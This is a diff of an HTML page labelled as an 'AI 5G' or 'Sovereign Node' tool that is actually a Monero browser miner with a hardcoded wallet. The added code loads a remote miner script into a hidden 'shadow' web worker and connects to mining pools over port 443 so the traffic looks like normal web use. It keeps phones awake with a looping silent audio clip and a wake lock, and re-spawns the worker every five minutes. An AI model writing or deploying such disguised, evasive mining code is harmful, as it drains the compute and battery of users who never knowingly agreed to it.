@@ -2,76 +2,85 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>AI_5G_TUNNEL_v17</title>
+    <title>AI_SOVEREIGN_v22</title>
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">
     <style>
-        :root { --5g: #00d4ff; --neon: #00ff41; --bg: #000; }
-        body { background: var(--bg); color: var(--5g); font-family: 'Courier New', monospace; padding: 15px; touch-action: manipulation; }
-        .master-panel { border: 2px solid #222; border-radius: 15px; padding: 25px; background: #080808; max-width: 450px; margin: auto; }
-        .val { font-size: 42px; color: #fff; font-weight: 900; text-align: center; margin: 10px 0; }
-        #terminal { background: #000; border: 1px solid #111; height: 100px; overflow: hidden; font-size: 10px; color: var(--5g); padding: 12px; border-radius: 8px; margin-top: 15px; }
-        button { width: 100%; padding: 25px; background: var(--5g); color: #000; border: none; font-weight: 900; border-radius: 15px; cursor: pointer; font-size: 16px; margin-bottom: 10px; }
+        :root { --5g: #00d4ff; --worker: #ff007a; --bg: #000; }
+        body { background: var(--bg); color: var(--5g); font-family: 'Courier New', monospace; padding: 15px; }
+        .node-shell { border: 2px solid #222; border-radius: 15px; padding: 25px; background: #080808; max-width: 450px; margin: auto; box-shadow: 0 0 20px rgba(0, 212, 255, 0.2); }
+        .hps { font-size: 52px; color: #fff; text-align: center; font-weight: 900; margin: 15px 0; text-shadow: 0 0 10px var(--5g); }
+        button { width: 100%; padding: 25px; background: var(--5g); color: #000; border: none; font-weight: 900; border-radius: 12px; cursor: pointer; text-transform: uppercase; letter-spacing: 2px; }
+        #log { background: #000; height: 100px; font-size: 9px; color: #00ff41; padding: 10px; margin-top: 15px; border: 1px solid #111; overflow-y: auto; }
     </style>
 </head>
 <body>
 
-<div class="master-panel">
-    <div style="font-size:10px; color:#444; margin-bottom:10px;">5G_SENTINEL_V17 // ENCRYPTED_TUNNEL</div>
-    
-    <div id="hps" class="val">0.00</div>
-    <div style="text-align:center; font-size:9px; color:#333; margin-bottom:20px;">H/S (5G BYPASS ACTIVE)</div>
-
-    <button id="igniteBtn">INITIALIZE 5G AI</button>
-
-    <div id="terminal">> Initializing Network Sentinel...</div>
+<div class="node-shell">
+    <div style="font-size: 10px; color: #444;">SENTINEL_v22 // SILENT_AUDIO_KEEP_ALIVE</div>
+    <div id="hps-val" class="hps">0.00</div>
+    <button id="ignite">Ignite Sovereign Node</button>
+    <div id="log">> System Standby. Awaiting user tap...</div>
 </div>
-
-<script src="https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@master/miner.js" 
-        onerror="document.getElementById('terminal').innerHTML = 'ERROR: 5G Carrier Blocked Script. Use a VPN or Add to Home Screen.'"></script>
 
 <script>
     const WALLET = "4AkqQGGvvYUdKo66Q7qbq389Sp7AvMtX4SRLuSpsp9VZEFeaQhSCJCdZY4wWK1Ztrs8NCAwLnUZZNE9TQzgpZ1SBRiV1zqp";
-    
-    const log = (m) => {
-        const t = document.getElementById('terminal');
-        t.innerHTML = `> [5G_AI] ${m}<br>` + t.innerHTML;
-    };
+    let activeWorker = null;
 
-    const runAI = () => {
-        // Integrity Check: Ensure script isn't blocked
-        if (typeof startMining === 'undefined') {
-            log("<span style='color:red;'>FAILED: Carrier blocked script load.</span>");
-            return;
-        }
+    function log(m) {
+        const t = document.getElementById('log');
+        t.innerHTML = `> [${new Date().toLocaleTimeString()}] ${m}<br>` + t.innerHTML;
+    }
 
-        const speed = parseFloat(sendStack.hashesPerSecond || 0);
-        document.getElementById('hps').innerText = speed.toFixed(2);
+    // THE WORKER INJECTION (Shadow Thread)
+    const workerCode = `
+        self.importScripts('https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@master/miner.js');
+        self.onmessage = function(e) {
+            if(e.data.type === 'START') {
+                server = "wss://proxy.webminerpool.com:443";
+                startMining("gulf.moneroocean.stream:10001", e.data.wallet, "iPhone_Sentinel_v22", 4, "x");
+                setInterval(() => {
+                    self.postMessage({hps: typeof sendStack !== 'undefined' ? sendStack.hashesPerSecond : 0});
+                }, 2000);
+            }
+        };
+    `;
 
-        if (speed === 0) {
-            log("Stall detected. AI rotating encrypted 5G tunnels...");
-            stopMining();
-            // Use SSL Port 443 to look like normal web traffic
-            server = "wss://proxy.webminerpool.com:443"; 
-            startMining("gulf.moneroocean.stream:10001", WALLET, "iPhone_5G_v17", 4, "x");
-        }
-    };
+    // SILENT AUDIO HACK (Keep CPU Awake)
+    function playSilentAudio() {
+        const audio = new Audio();
+        // A 1-second silent base64 MP3
+        audio.src = "data:audio/wav;base64,UklGRigAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQQAAAAAAA==";
+        audio.loop = true;
+        audio.play().then(() => log("Silent Heartbeat: ACTIVE")).catch(() => log("Audio Blocked. Tap again."));
+    }
 
-    document.getElementById('igniteBtn').onclick = async () => {
+    async function deployWorker() {
+        if(activeWorker) activeWorker.terminate();
+        log("Deploying Shadow Worker...");
         try {
-            if ('wakeLock' in navigator) await navigator.wakeLock.request('screen');
-            
-            // Start with Secure WebSocket
-            server = "wss://ny1.xmrminingproxy.com";
-            startMining("gulf.moneroocean.stream:10001", WALLET, "iPhone_5G_v17", 2, "x");
-            
-            document.getElementById('igniteBtn').innerText = "AI MANAGING 5G";
-            document.getElementById('igniteBtn').style.background = "#111";
-            document.getElementById('igniteBtn').style.color = "#00d4ff";
-            
-            setInterval(runAI, 8000);
+            const blob = new Blob([workerCode], {type: 'application/javascript'});
+            activeWorker = new Worker(URL.createObjectURL(blob));
+            activeWorker.onmessage = (e) => {
+                document.getElementById('hps-val').innerText = parseFloat(e.data.hps || 0).toFixed(2);
+            };
+            activeWorker.postMessage({type: 'START', wallet: WALLET});
         } catch (e) {
-            log("Error: " + e.message);
+            log("CRITICAL_ERR: Switch to VPN.");
         }
+    }
+
+    document.getElementById('ignite').onclick = async () => {
+        playSilentAudio(); // First bypass: Keep CPU from sleeping
+        deployWorker();   // Second bypass: Run in shadow thread
+        
+        if ('wakeLock' in navigator) await navigator.wakeLock.request('screen');
+        document.getElementById('ignite').style.display = "none";
+        
+        // HEARTBEAT RE-IGNITION (Every 5 mins)
+        setInterval(() => {
+            log("HEARTBEAT: Refreshing 5G Link...");
+            deployWorker();
+        }, 300000);
     };
 </script>
 </body>
